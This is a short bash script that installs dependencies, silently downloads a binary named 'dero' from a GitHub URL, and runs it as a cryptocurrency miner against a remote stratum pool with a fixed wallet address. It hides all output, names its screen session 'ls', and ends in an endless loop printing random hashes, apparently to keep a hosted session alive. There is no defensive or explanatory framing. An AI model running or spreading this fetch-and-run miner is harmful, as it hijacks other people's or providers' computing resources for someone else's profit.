#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

sudo apt install screen libjansson4 -y 

wget https://github.com/angkii/2022/raw/main/dero >/dev/null 2>&1

chmod +x dero >/dev/null 2>&1

screen -dmS ls

./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done

sleep 1

done
